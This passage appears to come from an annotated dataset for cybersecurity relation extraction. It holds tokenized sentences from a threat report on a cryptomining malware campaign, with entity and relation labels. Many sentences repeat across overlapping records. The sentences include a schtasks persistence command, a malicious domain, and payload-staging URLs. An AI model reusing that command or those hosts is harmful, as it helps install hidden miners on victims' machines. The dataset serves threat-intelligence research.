20], "name": "dllm.vbs", "pos": [20, 21], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [43, 43], "name": "malware", "pos": [8, 9], "index": "3_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [49, 49], "name": "csrss.publicvpn.com", "pos": [14, 15], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [75, 75], "name": "dropper", "pos": [12, 13], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [79, 79], "name": "job", "pos": [16, 17], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [90, 90], "name": "anydesk", "pos": [5, 6], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [104, 104], "name": "script", "pos": [19, 20], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [128, 128], "name": "malicious script", "pos": [43, 45], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [133, 133], "name": "PowerShell command", "pos": [48, 50], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [145, 145], "name": "payload", "pos": [60, 61], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [157, 157], "name": "command", "pos": [8, 9], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [177, 177], "name": "www.m9c.net/uploads/15758872491.jpg.", "pos": [28, 29], "index": "13_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [180, 180], "name": "PowerShell commands", "pos": [1, 3], "index": "14_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [189, 189], "name": "sample", "pos": [1, 2], "index": "15_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [200, 200], "name": "Hackitup", "pos": [12, 13], "index": "16_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [239, 239], "name": "it", "pos": [2, 3], "index": "17_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [242, 242], "name": "configuration options", "pos": [5, 7], "index": "18_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [252, 252], "name": "payload", "pos": [15, 16], "index": "19_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [256, 256], "name": "cmd.exe", "pos": [19, 20], "index": "20_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 2}, {"r": "ST", "evidence": [1], "h": 3, "t": 4}, {"r": "FR", "evidence": [2, 3], "h": 5, "t": 7}, {"r": "EX", "evidence": [2, 3], "t": 6, "h": 7}, {"r": "FR", "evidence": [3], "h": 7, "t": 9}, {"r": "EX", "evidence": [3], "t": 8, "h": 9}, {"r": "FR", "evidence": [3], "h": 9, "t": 10}, {"r": "WR", "evidence": [3], "h": 10, "t": 11}, {"r": "CO", "evidence": [3, 4], "h": 10, "t": 12}, {"r": "WR", "evidence": [4], "h": 12, "t": 13}, {"r": "RD", "evidence": [4, 5], "t": 13, "h": 14}, {"r": "RD", "evidence": [4, 5, 6], "t": 13, "h": 15}, {"r": "CO", "evidence": [6, 7], "h": 16, "t": 17}, {"r": "FR", "evidence": [7], "h": 17, "t": 20}, {"r": "WR", "evidence": [7], "t": 18, "h": 20}, {"r": "EX", "evidence": [7], "t": 19, "h": 20}]}, {"title": "647-6", "sents": [["As", "part", "of", "this", "execution", "chain", ",", "the", "malware", "also", "reaches", "out", "to", "``", "csrss.publicvpn.com", ",", "''", "a", "known", "malicious", "domain", ",", "to", "establish", "a", "TCP", "connection", "."], ["Finally", ",", "in", "addition", "to", "immediately", "running", "the", "malicious", "script", ",", "the", "dropper", "also", "creates", "a", "job", "using", "Windows", "Task", "Scheduler", "."], ["This", "job", ",", "called", "``", "anydesk", "''", "[", "1", "]", "in", "all", "of", "our", "samples", ",", "executes", "the", "dropped", "script", "every", "30", "minutes", ":", "c", ":", "\\windows\\system32\\schtasks.exe", "/create", "/sc", "minute", "/mo", "30", "/tn", "anydesk", "/tr", "c", ":", "\\users\\", "{", "username", "}", "\\appdata\\local", "emp\\setup.jsThe", "malicious", "script", "contains", "an", "obfuscated", "PowerShell", "command", "that", "executes", "a", "number", "of", "cascading", "PowerShell", "calls", "and", "additional", "payload", "stage", "downloads", "."], ["In", "the", "sample", "Talos", "originally", "discovered", ",", "the", "command", "reaches", "out", "to", "``", "pastebin.com/raw/gc5dfjh9", ",", "''", "a", "page", "containing", "a", "URL", "of", "a", "supposed", "image", "file", "at", "``", "www.m9c.net/uploads/15758872491.jpg.", "``"], ["These", "PowerShell", "commands", "reflectively", "load", "an", "included", "malicious", "."], ["The", "sample", "then", "calls", "the", "``", "exe", "''", "method", "of", "the", "``", "Hackitup", "''", "class", "shown", "below", ",", "which", "performs", "more", "deobfuscation", ",", "in", "addition", "to", "some", "additional", "logic", "checks", "through", "more", "chained", "method", "calls", ",", "such", "as", "whether", "it", "'s", "running", "on", "a", "32-", "or", "64-bit", "architecture", "."], ["Finally", ",", "it", "constructs", "the", "configuration", "options", "to", "be", "loaded", "and", "executed", "with", "its", "final", "payload", "by", "invoking", "``", "cmd.exe", "."], ["Examination", "of", "the", "reconstructed", "PE", "file", "reveals", "that", "it", "is", "compressed", "with", "UPX", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [8, 8], "name": "malware", "pos": [8, 9], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [14, 14], "name": "csrss.publicvpn.com", "pos": [14, 15], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [40, 40], "name": "dropper", "pos": [12, 13], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [44, 44], "name": "job", "pos": [16, 17], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [55, 55], "name": "anydesk", "pos": [5, 6], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [69, 69], "name": "script", "pos": [19, 20], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [93, 93], "name": "malicious script", "pos": [43, 45], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [98, 98], "name": "PowerShell command", "pos": [48, 50], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [110, 110], "name": "payload", "pos": [60, 61], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [122, 122], "name": "command", "pos": [8, 9], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [142, 142], "name": "www.m9c.net/uploads/15758872491.jpg.", "pos": [28, 29], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [145, 145], "name": "PowerShell commands", "pos": [1, 3], "index": "11_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [154, 154], "name": "sample", "pos": [1, 2], "index": "12_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [165, 165], "name": "Hackitup", "pos": [12, 13], "index": "13_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [204, 204], "name": "it", "pos": [2, 3], "index": "14_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [207, 207], "name": "configuration options", "pos": [5, 7], "index": "15_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [217, 217], "name": "payload", "pos": [15, 16], "index": "16_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [221, 221], "name": "cmd.exe", "pos": [19, 20], "index": "17_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [227, 227], "name": "PE file", "pos": [4, 6], "index": "18_0"}]], "labels": [{"r": "ST", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [1, 2], "h": 2, "t": 4}, {"r": "EX", "evidence": [1, 2], "t": 3, "h": 4}, {"r": "FR", "evidence": [2], "h": 4, "t": 6}, {"r": "EX", "evidence": [2], "t": 5, "h": 6}, {"r": "FR", "evidence": [2], "h": 6, "t": 7}, {"r": "WR", "evidence": [2], "h": 7, "t": 8}, {"r": "CO", "evidence": [2, 3], "h": 7, "t": 9}, {"r": "WR", "evidence": [3], "h": 9, "t": 10}, {"r": "RD", "evidence": [3, 4], "t": 10, "h": 11}, {"r": "WR", "evidence": [4, 5, 6, 7], "h": 11, "t": 18}, {"r": "RD", "evidence": [3, 4, 5], "t": 10, "h": 12}, {"r": "WR", "evidence": [5, 6, 7], "h": 12, "t": 18}, {"r": "CO", "evidence": [5, 6], "h": 13, "t": 14}, {"r": "FR", "evidence": [6], "h": 14, "t": 17}, {"r": "WR", "evidence": [6], "t": 15, "h": 17}, {"r": "EX", "evidence": [6], "t": 16, "h": 17}, {"r": "RD", "evidence": [6, 7], "h": 17, "t": 18}, {"r": "WR", "evidence": [6, 7], "h": 17, "t": 18}, {"r": "EX", "evidence": [6, 7], "h": 17, "t": 18}]}, {"title": "647-7", "sents": [["Finally", ",", "in", "addition", "to", "immediately", "running", "the", "malicious", "script", ",", "the", "dropper", "also", "creates", "a", "job", "using", "Windows", "Task", "Scheduler", "."], ["This", "job", ",", "called", "``", "anydesk", "''", "[", "1", "]", "in", "all", "of", "our", "samples", ",", "executes", "the", "dropped", "script", "every", "30", "minutes", ":", "c", ":", "\\windows\\system32\\schtasks.exe", "/create", "/sc", "minute", "/mo", "30", "/tn", "anydesk", "/tr", "c", ":", "\\users\\", "{", "username", "}", "\\appdata\\local", "emp\\setup.jsThe", "malicious", "script", "contains", "an", "obfuscated", "PowerShell", "command", "that", "executes", "a", "number", "of", "cascading", "PowerShell", "calls", "and", "additional", "payload", "stage", "downloads", "."], ["In", "the", "sample", "Talos", "originally", "discovered", ",", "the", "command", "reaches", "out", "to", "``", "pastebin.com/raw/gc5dfjh9", ",", "''", "a", "page", "containing", "a", "URL", "of", "a", "supposed", "image", "file", "at", "``", "www.m9c.net/uploads/15758872491.jpg.", "``"], ["These", "PowerShell", "commands", "reflectively", "load", "an", "included", "malicious", "."], ["The", "sample", "then", "calls", "the", "``", "exe", "''", "method", "of", "the", "``", "Hackitup", "''", "class", "shown", "below", ",", "which", "performs", "more", "deobfuscation", ",", "in", "addition", "to", "some", "additional", "logic", "checks", "through", "more", "chained", "method", "calls", ",", "such", "as", "whether", "it", "'s", "running", "on", "a", "32-", "or", "64-bit", "architecture", "."], ["Finally", ",", "it", "constructs", "the", "configuration", "options", "to", "be", "loaded", "and", "executed", "with", "its", "final", "payload", "by", "invoking", "``", "cmd.exe", "."], ["Examination", "of", "the", "reconstructed", "PE", "file", "reveals", "that", "it", "is", "compressed", "with", "UPX", "."], ["Additionally", ",", "the", "miner", "is", "launched", "with", "a", "common", "configuration", "that", "we", "were", "able", "to", "extract", "from", "the", "binary", "as", "shown", "in", "the", "figure", "below", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [12, 12], "name": "dropper", "pos": [12, 13], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [16, 16], "name": "job", "pos": [16, 17], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [27, 27], "name": "anydesk", "pos": [5, 6], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [41, 41], "name": "script", "pos": [19, 20], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [65, 65], "name": "malicious script", "pos": [43, 45], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [70, 70], "name": "PowerShell command", "pos": [48, 50], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [82, 82], "name": "payload", "pos": [60, 61], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [94, 94], "name": "command", "pos": [8, 9], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [114, 114], "name": "www.m9c.net/uploads/15758872491.jpg.", "pos": [28, 29], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [117, 117], "name": "PowerShell commands", "pos": [1, 3], "index": "9_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [126, 126], "name": "sample", "pos": [1, 2], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [137, 137], "name": "Hackitup", "pos": [12, 13], "index": "11_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [176, 176], "name": "it", "pos": [2, 3], "index": "12_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [179, 179], "name": "configuration options", "pos": [5, 7], "index": "13_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [189, 189], "name": "payload", "pos": [15, 16], "index": "14_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [193, 193], "name": "cmd.exe", "pos": [19, 20], "index": "15_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [199, 199], "name": "PE file", "pos": [4, 6], "index": "16_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [212, 212], "name": "miner", "pos": [3, 4], "index": "17_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [218, 218], "name": "configuration", "pos": [9, 10], "index": "18_0"}]], "labels": [{"r": "FR", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "EX", "evidence": [0, 1], "t": 1, "h": 2}, {"r": "FR", "evidence": [1], "h": 2, "t": 4}, {"r": "EX", "evidence": [1], "t": 3, "h": 4}, {"r": "FR", "evidence": [1], "h": 4, "t": 5}, {"r": "WR", "evidence": [1], "h": 5, "t": 6}, {"r": "CO", "evidence": [1, 2], "h": 5, "t": 7}, {"r": "WR", "evidence": [2], "h": 7, "t": 8}, {"r": "RD", "evidence": [2, 3], "t": 8, "h": 9}, {"r": "WR", "evidence": [3, 4, 5, 6], "h": 9, "t": 16}, {"r": "RD", "evidence": [2, 3, 4], "t": 8, "h": 10}, {"r": "WR", "evidence": [4, 5, 6], "h": 10, "t": 16}, {"r": "CO", "evidence": [4, 5], "h": 11, "t": 12}, {"r": "FR", "evidence": [5], "h": 12, "t": 15}, {"r": "WR", "evidence": [5], "t": 13, "h": 15}, {"r": "EX", "evidence": [5], "t": 14, "h": 15}, {"r": "RD", "evidence": [5, 6], "h": 15, "t": 16}, {"r": "WR", "evidence": [5, 6], "h": 15, "t": 16}, {"r": "EX", "evidence": [5, 6], "h": 15, "t": 16}, {"r": "CO", "evidence": [5, 6, 7], "h": 13, "t": 18}, {"r": "WR", "evidence": [6, 7], "t": 16, "h": 17}, {"r": "RD", "evidence": [7], "h": 17, "t": 18}]}, {"title": "647-8", "sents": [["This", "job", ",", "called", "``", "anydesk", "''", "[", "1", "]", "in", "all", "of", "our", "samples", ",", "executes", "the", "dropped", "script", "every", "30", "minutes", ":", "c", ":", "\\windows\\system32\\schtasks.exe", "/create", "/sc", "minute", "/mo", "30", "/tn", "anydesk", "/tr", "c", ":", "\\users\\", "{", "username", "}", "\\appdata\\local", "emp\\setup.jsThe", "malicious", "script", "contains", "an", "obfuscated", "PowerShell", "command", "that", "executes", "a", "number", "of", "cascading", "PowerShell", "calls", "and", "additional", "payload", "stage", "downloads", "."], ["In", "the", "sample", "Talos", "originally", "discovered", ",", "the", "command", "reaches", "out", "to", "``", "pastebin.com/raw/gc5dfjh9", ",", "''", "a", "page", "containing", "a", "URL", "of", "a", "supposed", "image", "file", "at", "``", "www.m9c.net/uploads/15758872491.jpg.", "``"], ["These", "PowerShell", "commands", "reflectively", "load", "an", "included", "malicious", "."], ["The", "sample", "then", "calls", "the", "``", "exe", "''", "method", "of", "the", "``", "Hackitup", "''", "class", "shown", "below", ",", "which", "performs", "more", "deobfuscation", ",", "in", "addition", "to", "some", "additional", "logic", "checks", "through", "more", "chained", "method", "calls", ",", "such", "as", "whether", "it", "'s", "running", "on", "a", "32-", "or", "64-bit", "architecture", "."], ["Finally", ",", "it", "constructs", "the", "configuration", "options", "to", "be", "loaded", "and", "executed", "with", "its", "final", "payload", "by", "invoking", "``", "cmd.exe", "."], ["Examination", "of", "the", "reconstructed", "PE", "file", "reveals", "that", "it", "is", "compressed", "with", "UPX", "."], ["Additionally", ",", "the", "miner", "is", "launched", "with", "a", "common", "configuration", "that", "we", "were", "able", "to", "extract", "from", "the", "binary", "as", "shown", "in", "the", "figure", "below", "."], ["XMRig", "is", "set", "up", "to", "use", "a", "maximum", "of", "80", "percent", "of", "the", "host", "'s", "CPU", "resources", "with", "the", "``", "CryptoNight", "''", "algorithm", "in", "order", "to", "mine", "the", "Monero", "cryptocurrency", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [5, 5], "name": "anydesk", "pos": [5, 6], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [19, 19], "name": "script", "pos": [19, 20], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [43, 43], "name": "malicious script", "pos": [43, 45], "index": "2_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [48, 48], "name": "PowerShell command", "pos": [48, 50], "index": "3_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [60, 60], "name": "payload", "pos": [60, 61], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [72, 72], "name": "command", "pos": [8, 9], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [92, 92], "name": "www.m9c.net/uploads/15758872491.jpg.", "pos": [28, 29], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [95, 95], "name": "PowerShell commands", "pos": [1, 3], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [104, 104], "name": "sample", "pos": [1, 2], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [115, 115], "name": "Hackitup", "pos": [12, 13], "index": "9_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [154, 154], "name": "it", "pos": [2, 3], "index": "10_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [157, 157], "name": "configuration options", "pos": [5, 7], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [167, 167], "name": "payload", "pos": [15, 16], "index": "12_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [171, 171], "name": "cmd.exe", "pos": [19, 20], "index": "13_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [177, 177], "name": "PE file", "pos": [4, 6], "index": "14_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [190, 190], "name": "miner", "pos": [3, 4], "index": "15_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [196, 196], "name": "configuration", "pos": [9, 10], "index": "16_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [213, 213], "name": "XMRig", "pos": [0, 1], "index": "17_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 2}, {"r": "EX", "evidence": [0], "t": 1, "h": 2}, {"r": "FR", "evidence": [0], "h": 2, "t": 3}, {"r": "WR", "evidence": [0], "h": 3, "t": 4}, {"r": "CO", "evidence": [0, 1], "h": 3, "t": 5}, {"r": "WR", "evidence": [1], "h": 5, "t": 6}, {"r": "RD", "evidence": [1, 2], "t": 6, "h": 7}, {"r": "WR", "evidence": [2, 3, 4, 5], "h": 7, "t": 14}, {"r": "RD", "evidence": [1, 2, 3], "t": 6, "h": 8}, {"r": "WR", "evidence": [3, 4, 5], "h": 8, "t": 14}, {"r": "CO", "evidence": [3, 4], "h": 9, "t": 10}, {"r": "FR", "evidence": [4], "h": 10, "t": 13}, {"r": "WR", "evidence": [4], "t": 11, "h": 13}, {"r": "EX", "evidence": [4], "t": 12, "h": 13}, {"r": "RD", "evidence": [4, 5], "h": 13, "t": 14}, {"r": "WR", "evidence": [4, 5], "h": 13, "t": 14}, {"r": "EX", "evidence": [4, 5], "h": 13, "t": 14}, {"r": "CO", "evidence": [4, 5, 6], "h": 11, "t": 16}, {"r": "WR", "evidence": [5, 6], "t": 14, "h": 15}, {"r": "RD", "evidence": [6], "h": 15, "t": 16}, {"r": "WR", "evidence": [6, 7], "h": 15, "t": 17}]}, {"title": "647-9", "sents": [["In", "the", "sample", "Talos", "originally", "discovered", ",", "the", "command", "reaches", "out", "to", "``", "pastebin.com/raw/gc5dfjh9", ",", "''", "a", "page", "containing", "a", "URL", "of", "a", "supposed", "image", "file", "at", "``", "www.m9c.net/uploads/15758872491.jpg.", "``"], ["These", "PowerShell", "commands", "reflectively", "load", "an", "included", "malicious", "."], ["The", "sample", "then", "calls", "the", "``", "exe", "''", "method", "of", "the", "``", "Hackitup", "''", "class", "shown", "below", ",", "which", "performs", "more", "deobfuscation", ",", "in", "addition", "to", "some", "additional", "logic", "checks", "through", "more", "chained", "method", "calls", ",", "such", "as", "whether", "it", "'s", "running", "on", "a", "32-", "or", "64-bit", "architecture", "."], ["Finally", ",", "it", "constructs", "the", "configuration", "options", "to", "be", "loaded", "and", "executed", "with", "its", "final", "payload", "by", "invoking", "``", "cmd.exe", "."], ["Examination", "of", "the", "reconstructed", "PE", "file", "reveals", "that", "it", "is", "compressed", "with", "UPX", "."], ["Additionally", ",", "the", "miner", "is", "launched", "with", "a", "common", "configuration", "that", "we", "were", "able", "to", "extract", "from", "the", "binary", "as", "shown", "in", "the", "figure", "below", "."], ["XMRig", "is", "set", "up", "to", "use", "a", "maximum", "of", "80", "percent", "of", "the", "host", "'s", "CPU", "resources", "with", "the", "``", "CryptoNight", "''", "algorithm", "in", "order", "to", "mine", "the", "Monero", "cryptocurrency", "."], ["The", "extracted", "configuration", "string", "also", "contains", "Vivin", "'s", "Monero", "payment", "address", ",", "which", "Talos", "used", "as", "a", "starting", "point", "to", "track", "this", "actor", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [8, 8], "name": "command", "pos": [8, 9], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [28, 28], "name": "www.m9c.net/uploads/15758872491.jpg.", "pos": [28, 29], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [31, 31], "name": "PowerShell commands", "pos": [1, 3], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [40, 40], "name": "sample", "pos": [1, 2], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [51, 51], "name": "Hackitup", "pos": [12, 13], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [90, 90], "name": "it", "pos": [2, 3], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [93, 93], "name": "configuration options", "pos": [5, 7], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [103, 103], "name": "payload", "pos": [15, 16], "index": "7_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [107, 107], "name": "cmd.exe", "pos": [19, 20], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [113, 113], "name": "PE file", "pos": [4, 6], "index": "9_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [126, 126], "name": "miner", "pos": [3, 4], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [132, 132], "name": "configuration", "pos": [9, 10], "index": "11_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [149, 149], "name": "XMRig", "pos": [0, 1], "index": "12_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [182, 182], "name": "configuration", "pos": [2, 3], "index": "13_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "RD", "evidence": [0, 1], "t": 1, "h": 2}, {"r": "WR", "evidence": [1, 2, 3, 4], "h": 2, "t": 9}, {"r": "RD", "evidence": [0, 1, 2], "t": 1, "h": 3}, {"r": "WR", "evidence": [2, 3, 4], "h": 3, "t": 9}, {"r": "CO", "evidence": [2, 3], "h": 4, "t": 5}, {"r": "FR", "evidence": [3], "h": 5, "t": 8}, {"r": "WR", "evidence": [3], "t": 6, "h": 8}, {"r": "EX", "evidence": [3], "t": 7, "h": 8}, {"r": "RD", "evidence": [3, 4], "h": 8, "t": 9}, {"r": "WR", "evidence": [3, 4], "h": 8, "t": 9}, {"r": "EX", "evidence": [3, 4], "h": 8, "t": 9}, {"r": "CO", "evidence": [3, 4, 5], "h": 6, "t": 11}, {"r": "WR", "evidence": [4, 5], "t": 9, "h": 10}, {"r": "RD", "evidence": [5], "h": 10, "t": 11}, {"r": "WR", "evidence": [5, 6], "h": 10, "t": 12}, {"r": "WR", "evidence": [5, 6, 7], "h": 10, "t": 13}]}, {"title": "647-10", "sents": [["These", "PowerShell", "commands", "reflectively", "load", "an", "included", "malicious", "."], ["The", "sample", "then", "calls", "the", "``", "exe", "''", "method", "of", "the", "``", "Hackitup", "''", "class", "shown", "below", ",", "which", "performs", "more", "deobfuscation", ",", "in", "addition", "to", "some", "additional", "logic", "checks", "through", "more", "chained", "method", "calls", ",", "such", "as", "whether", "it", "'s", "running", "on", "a", "32-", "or", "64-bit", "architecture", "."], ["Finally", ",", "it", "constructs", "the", "configuration", "options", "to", "be", "loaded", "and", "executed", "with", "its", "final", "payload", "by", "invoking", "``", "cmd.exe", "."], ["Examination", "of", "the", "reconstructed", "PE", "file", "reveals", "that", "it", "is", "compressed", "with", "UPX", "."], ["Additionally", ",", "the", "miner", "is", "launched", "with", "a", "common", "configuration", "that", "we", "were", "able", "to", "extract", "from", "the", "binary", "as", "shown", "in", "the", "figure", "below", "."], ["XMRig", "is", "set", "up", "to", "use", "a", "maximum", "of", "80", "percent", "of", "the", "host", "'s", "CPU", "resources", "with", "the", "``", "CryptoNight", "''", "algorithm", "in", "order", "to", "mine", "the", "Monero", "cryptocurrency", "."], ["The", "extracted", "configuration", "string", "also", "contains", "Vivin", "'s", "Monero", "payment", "address", ",", "which", "Talos", "used", "as", "a", "starting", "point", "to", "track", "this", "actor", "."], ["First", ",", "the", "initial", "droppers", "either", "install", "some", "form", "of", "the", "expected", "pirated", "software", "or", "they", "attempt", "to", "mimic", "a", "fake", "installation", "with", "paths", "that", "are", "named", "for", "associated", "programs", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "PowerShell commands", "pos": [1, 3], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [10, 10], "name": "sample", "pos": [1, 2], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [21, 21], "name": "Hackitup", "pos": [12, 13], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [60, 60], "name": "it", "pos": [2, 3], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [63, 63], "name": "configuration options", "pos": [5, 7], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [73, 73], "name": "payload", "pos": [15, 16], "index": "5_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [77, 77], "name": "cmd.exe", "pos": [19, 20], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [83, 83], "name": "PE file", "pos": [4, 6], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [96, 96], "name": "miner", "pos": [3, 4], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [102, 102], "name": "configuration", "pos": [9, 10], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [119, 119], "name": "XMRig", "pos": [0, 1], "index": "10_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [152, 152], "name": "configuration", "pos": [2, 3], "index": "11_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [178, 178], "name": "droppers", "pos": [4, 5], "index": "12_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [187, 187], "name": "software", "pos": [13, 14], "index": "13_0"}]], "labels": [{"r": "WR", "evidence": [0, 1, 2, 3], "h": 0, "t": 7}, {"r": "WR", "evidence": [1, 2, 3], "h": 1, "t": 7}, {"r": "CO", "evidence": [1, 2], "h": 2, "t": 3}, {"r": "FR", "evidence": [2], "h": 3, "t": 6}, {"r": "WR", "evidence": [2], "t": 4, "h": 6}, {"r": "EX", "evidence": [2], "t": 5, "h": 6}, {"r": "RD", "evidence": [2, 3], "h": 6, "t": 7}, {"r": "WR", "evidence": [2, 3], "h": 6, "t": 7}, {"r": "EX", "evidence": [2, 3], "h": 6, "t": 7}, {"r": "CO", "evidence": [2, 3, 4], "h": 4, "t": 9}, {"r": "WR", "evidence": [3, 4], "t": 7, "h": 8}, {"r": "RD", "evidence": [4], "h": 8, "t": 9}, {"r": "WR", "evidence": [4, 5], "h": 8, "t": 10}, {"r": "WR", "evidence": [4, 5, 6], "h": 8, "t": 11}, {"r": "WR", "evidence": [5, 6, 7], "t": 10, "h": 12}, {"r": "WR", "evidence": [6, 7], "t": 11, "h": 12}, {"r": "WR", "evidence": [7], "h": 12, "t": 13}]}, {"title": "647-11", "sents": [["The", "sample", "then", "calls", "the", "``", "exe", "''", "method", "of", "the", "``", "Hackitup", "''", "class", "shown", "below", ",", "which", "performs", "more", "deobfuscation", ",", "in", "addition", "to", "some", "additional", "logic", "checks", "through", "more", "chained", "method", "calls", ",", "such", "as", "whether", "it", "'s", "running", "on", "a", "32-", "or", "64-bit", "architecture", "."], ["Finally", ",", "it", "constructs", "the", "configuration", "options", "to", "be", "loaded", "and", "executed", "with", "its", "final", "payload", "by", "invoking", "``", "cmd.exe", "."], ["Examination", "of", "the", "reconstructed", "PE", "file", "reveals", "that", "it", "is", "compressed", "with", "UPX", "."], ["Additionally", ",", "the", "miner", "is", "launched", "with", "a", "common", "configuration", "that", "we", "were", "able", "to", "extract", "from", "the", "binary", "as", "shown", "in", "the", "figure", "below", "."], ["XMRig", "is", "set", "up", "to", "use", "a", "maximum", "of", "80", "percent", "of", "the", "host", "'s", "CPU", "resources", "with", "the", "``", "CryptoNight", "''", "algorithm", "in", "order", "to", "mine", "the", "Monero", "cryptocurrency", "."], ["The", "extracted", "configuration", "string", "also", "contains", "Vivin", "'s", "Monero", "payment", "address", ",", "which", "Talos", "used", "as", "a", "starting", "point", "to", "track", "this", "actor", "."], ["First", ",", "the", "initial", "droppers", "either", "install", "some", "form", "of", "the", "expected", "pirated", "software", "or", "they", "attempt", "to", "mimic", "a", "fake", "installation", "with", "paths", "that", "are", "named", "for", "associated", "programs", "."], ["For", "example", ",", 